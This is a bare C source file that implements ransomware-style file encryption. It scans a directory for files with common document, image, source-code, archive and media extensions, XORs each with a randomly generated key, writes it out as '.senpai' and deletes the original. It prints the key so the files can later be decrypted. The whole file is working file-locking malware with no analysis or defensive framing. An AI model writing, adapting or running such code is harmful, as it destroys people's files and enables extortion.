#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <dirent.h>
#include <sys/stat.h>
#ifdef _WIN32
#include <windows.h>
#define PS '\\'
#else
#define PS '/'
#endif

#define KL 32
const char *ext[] = {".jpg", ".txt", ".png", ".pdf", ".hwp", ".psd", ".cs", ".c", ".cpp", ".vb", ".bas", ".frm", ".mp3", ".wav", ".flac", ".gif", ".doc", ".xls", ".xlsx", ".docx", ".ppt", ".pptx", ".js", ".avi", ".mp4", ".mkv", ".zip", ".rar", ".alz", ".egg", ".7z", ".jpeg"};
#define NE (sizeof(ext) / sizeof(ext[0]))

int chk_ext(const char *f) {
    for (size_t i = 0; i < NE; i++) if (strstr(f, ext[i])) return 1;
    return 0;
}

void xor(unsigned char *d, size_t dl, unsigned char *k, size_t kl) {
    for (size_t i = 0; i < dl; i++) d[i] ^= k[i % kl];
}

unsigned char *gen_key(size_t l) {
    unsigned char *k = malloc(l);
    RAND_bytes(k, l);
    return k;
}

char *enc_b64(const unsigned char *k, size_t l) {
    char *o = malloc(4 * ((l + 2) / 3) + 1);
    EVP_EncodeBlock((unsigned char *)o, k, l);
    return o;
}

unsigned char *dec_b64(const char *k, size_t *ol) {
    unsigned char *o = malloc(strlen(k));
    *ol = EVP_DecodeBlock(o, (const unsigned char *)k, strlen(k));
    return o;
}

void enc_f(const char *fp, unsigned char *k) {
    FILE *f = fopen(fp, "rb");
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char *d = malloc(sz);
    fread(d, 1, sz, f);
    fclose(f);
    xor(d, sz, k, KL);
    char ep[1024];
    snprintf(ep, sizeof(ep), "%s.senpai", fp);
    f = fopen(ep, "wb");
    fwrite(d, 1, sz, f);
    fclose(f);
    free(d);
    remove(fp);
}

void dec_f(const char *fp, unsigned char *k) {
    FILE *f = fopen(fp, "rb");
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char *d = malloc(sz);
    fread(d, 1, sz, f);
    fclose(f);
    xor(d, sz, k, KL);
    char dp[1024];
    snprintf(dp, sizeof(dp), "%s", fp);
    dp[strlen(dp) - 7] = '\0';
    f = fopen(dp, "wb");
    fwrite(d, 1, sz, f);
    fclose(f);
    free(d);
    remove(fp);
}

void enc_d(const char *d, unsigned char *k) {
    struct dirent *e;
    DIR *dp = opendir(d);
    while ((e = readdir(dp))) {
        if (e->d_type == DT_REG) {
            char fp[1024];
            snprintf(fp, sizeof(fp), "%s%c%s", d, PS, e->d_name);
            if (chk_ext(e->d_name)) enc_f(fp, k);
        }
    }
    closedir(dp);
}

void dec_d(const char *d, unsigned char *k) {
    struct dirent *e;
    DIR *dp = opendir(d);
    while ((e = readdir(dp))) {
        if (e->d_type == DT_REG && strstr(e->d_name, ".senpai")) {
            char fp[1024];
            snprintf(fp, sizeof(fp), "%s%c%s", d, PS, e->d_name);
            dec_f(fp, k);
        }
    }
    closedir(dp);
}

int main(int ac, char *av[]) {
    const char *d = "test";
    if (ac == 1) {
        unsigned char *k = gen_key(KL);
        char *ek = enc_b64(k, KL);
        printf("Key: %s\n", ek);
        enc_d(d, k);
        free(k);
        free(ek);
    } else {
        size_t kl;
        unsigned char *k = dec_b64(av[1], &kl);
        dec_d(d, k);
        free(k);
    }
    return 0;
}
